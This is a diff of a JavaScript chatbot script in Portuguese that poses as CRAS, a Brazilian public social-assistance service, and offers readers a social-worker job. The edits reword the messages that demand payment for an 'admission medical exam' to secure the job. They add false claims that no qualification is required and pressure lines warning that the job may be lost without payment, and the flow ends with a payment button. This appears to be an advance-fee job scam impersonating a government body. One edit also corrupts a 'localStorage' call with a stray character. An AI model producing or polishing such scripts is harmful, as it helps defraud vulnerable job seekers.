@@ -604,11 +604,11 @@ const startWorkResponses = {
             delay: 3500
         },
         {
-            message: "O CRAS fornecerá gratuitamente o exame médico admissional, que será realizado em clínica credenciada em apenas 1 dia.",
+            message: "O CRAS fornecerá gratuitamente o curso de serviço social para que você possa atuar na area.",
             delay: 4000
         },
         {
-            message: "Com este exame, você receberá o atestado de saúde ocupacional, garantindo que está apto para exercer as funções de Assistente Social.",
+            message: "Não é exigido nenhum curso ou experiência prévia para ocupar a função de Assistente Social. O único curso exigido será fornecido pelo CRAS.",
             delay: 4200
         },
         {
@@ -621,7 +621,7 @@ const startWorkResponses = {
         },
         {
             message: function() {
-                const locationData = localStorage.getItem('trainingLocation');
+                const locationData = lƒocalStorage.getItem('trainingLocation');
                 if (locationData) {
                     try {
                         const location = JSON.parse(locationData);
@@ -634,23 +634,21 @@ const startWorkResponses = {
                 }
             },
             delay: 4500,
-            showImage: 'https://i.ibb.co/gLpTqVH8/IMG-4524-1.jpg'
         },
         {
             message: "Neste dia será iniciado o processo de contratação através do exame médico admissional, onde serão realizados exames clínicos, laboratoriais e avaliação psicológica para verificar sua aptidão para exercer as funções de Assistente Social.",
             delay: 5000
         },
         {
-            message: "Como já foi informado, o CRAS fornecerá todos os exames e avaliações necessários gratuitamente, mas você precisa realizar o pagamento da taxa de processamento de documentos que será usada para emissão dos laudos médicos.",
+            message: "Como já foi informado, você precisa realizar o pagamento do exame admissional para garantir sua vaga.",
             delay: 4500,
-            showImage: 'https://i.ibb.co/Xf8G9m0p/assets-task-01jwtj2gbbfvp9n65m4ed1n78p-1748943129-img-1-1-1.png'
         },
         {
-            message: "Se trata da taxa de processamento de documentos no valor de R$ 73,40. Essa é a única despesa que você terá no processo e essa taxa serve para emissão de todos os laudos médicos necessários.",
+            message: "Se trata do exame admissional para que possamos assinar sua Carteira de Trabalho.",
             delay: 4000
         },
         {
-            message: "Sem o pagamento, infelizmente não conseguirei agendar o treinamento e você pode perder a vaga a qualquer momento.",
+            message: "Sem o pagamento, infelizmente não conseguirei dar andamento na sua contratação e você pode perder a vaga a qualquer momento.",
             delay: 3500
         },
         {
@@ -671,7 +669,7 @@ const paymentConfirmation = [
         delay: 4000
     },
     {
-        message: "Para realizar o pagamento é só clicar no botão abaixo para acessar a guia de pagamento.",
+        message: "Para realizar o pagamento é só clicar no botão abaixo para acessar a guia de pagamento do exame médico:",
         delay: 4500,
         showPaymentButton: true
     }
